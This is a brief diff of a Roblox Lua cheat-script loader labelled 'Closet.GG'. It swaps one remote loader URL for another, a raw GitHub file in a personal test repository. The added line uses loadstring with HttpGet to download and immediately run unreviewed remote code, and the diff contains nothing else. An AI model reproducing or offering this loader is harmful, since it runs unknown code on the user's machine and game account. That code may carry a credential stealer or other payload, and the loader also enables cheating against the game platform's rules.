@@ -4,4 +4,5 @@
 
     Closet.GG > Premium/Skidded slops
 ]] 
-loadstring(game:HttpGet("https://flowauth.net/v1/loaders/Loader_V3_Closet_GG.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SoulSociety982/Test/refs/heads/main/Loader.lua%20(1).txt"))()
